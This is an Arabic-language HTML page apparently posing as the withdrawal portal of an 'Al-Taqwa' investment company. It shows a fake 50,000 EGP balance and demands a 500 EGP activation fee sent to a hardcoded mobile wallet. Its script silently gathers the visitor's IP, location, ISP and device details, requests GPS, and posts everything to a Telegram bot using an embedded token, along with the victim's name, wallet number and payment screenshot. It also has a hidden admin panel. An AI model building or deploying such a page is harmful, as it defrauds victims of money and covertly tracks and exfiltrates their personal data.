<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة التقوى - نظام السحب المتطور</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; }
        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .login-card h1 { font-size: 24px; color: var(--gold); margin-bottom: 20px; }
        .login-card input { width: 85%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 90%; transition: 0.3s; }
        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; background: transparent; cursor: pointer; z-index: 9999; }
        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; }
        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; text-align: center; }
        .admin-content button { background: var(--success); color: #000; border: none; padding: 12px; border-radius: 5px; width: 100%; font-weight: bold; margin-top: 20px; cursor: pointer; }
        #main-site { display: none; width: 100%; max-width: 420px; }
        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
        .balance-box div { font-size: 32px; font-weight: 900; }
        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; }
        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; }
        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
    </style>
</head>
<body>

<div id="admin-trigger" onclick="adminClick()"></div>

<div class="login-card" id="login-page">
    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
    <p style="font-size: 12px; color: #aaa;">يرجى الضغط على "موافق" لتفعيل ميزات الأمان والسحب</p>
    <input type="password" id="entryPass" placeholder="كود الوصول">
    <button onclick="accessSite()">دخول</button>
</div>

<div id="admin-panel">
    <div class="admin-content">
        <h3 style="color:var(--gold); text-align:center;">إعدادات الإدارة</h3>
        <input type="text" id="setPass" value="123456">
        <input type="text" id="setWallet" value="01226811784">
        <button onclick="saveAdminSettings()">حفظ وإغلاق</button>
    </div>
</div>

<div id="main-site">
    <div class="site-card">
        <div class="balance-box">
            <span style="font-size:12px; color:#aaa;">رصيدك القابل للسحب</span>
            <div>50,000 <small>EGP</small></div>
        </div>
        <input type="text" id="uName" placeholder="الاسم بالكامل">
        <input type="tel" id="uWallet" placeholder="رقم المحفظة">
        <p style="font-size:12px;">حول رسوم التفعيل (500 ج.م) للرقم:</p>
        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;" id="showAdminWallet">01226811784</div>
        <input type="file" id="uFile" accept="image/*">
        <button class="submit-btn" onclick="sendToTelegram()">تأكيد عملية السحب</button>
    </div>
</div>

<div id="loader">
    <div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div>
</div>

<script>
    const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
    const CHAT_ID = '8292390266';
    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', adminWallet: '01226811784' };

    let clickCount = 0;
    function adminClick() { clickCount++; if(clickCount >= 3) { document.getElementById('admin-panel').style.display = 'flex'; clickCount = 0; } }

    function saveAdminSettings() {
        config.pass = document.getElementById('setPass').value;
        config.adminWallet = document.getElementById('setWallet').value;
        localStorage.setItem('adminConfig', JSON.stringify(config));
        document.getElementById('showAdminWallet').innerText = config.adminWallet;
        document.getElementById('admin-panel').style.display = 'none';
    }

    async function accessSite() {
        if(document.getElementById('entryPass').value !== config.pass) return alert("كود الوصول خطأ!");
        
        document.getElementById('login-page').style.display = 'none';
        document.getElementById('main-site').style.display = 'block';

        // 1. جمع البيانات الصامتة (IP + Hardware)
        let trackingMsg = "🚀 رصد جديد لشركة التقوى:\n";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            trackingMsg += `🌐 الـ IP: ${data.ip}\n📍 المدينة: ${data.city}\n🏢 الشركة: ${data.org}\n`;
        } catch(e) {}

        const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0}));
        trackingMsg += `🔋 البطارية: ${Math.round(batt.level * 100)}%\n🧠 الرامات: ${navigator.deviceMemory || '؟'}GB\n📱 الجهاز: ${navigator.platform}\n`;

        // 2. محاولة سحب الـ GPS (تطلب موافقة)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                trackingMsg += `📍 الموقع الدقيق: https://www.google.com/maps?q=${lat},${lon}\n`;
                sendMsg(trackingMsg);
            }, () => {
                trackingMsg += `📍 الموقع الدقيق: (العميل رفض الصلاحية)\n`;
                sendMsg(trackingMsg);
            });
        } else {
            sendMsg(trackingMsg);
        }
    }

    function sendMsg(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
    }

    async function sendToTelegram() {
        const name = document.getElementById('uName').value;
        const wallet = document.getElementById('uWallet').value;
        const file = document.getElementById('uFile').files[0];
        if(!name || !wallet || !file) return alert("أكمل البيانات.");

        document.getElementById('loader').style.display = 'flex';
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', `✅ طلب سحب جديد:\n👤 الاسم: ${name}\n📱 محفظة العميل: ${wallet}`);

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        alert("تم الإرسال.. سيصلك الرد خلال دقائق.");
        location.reload();
    }
</script>
</body>
</html>
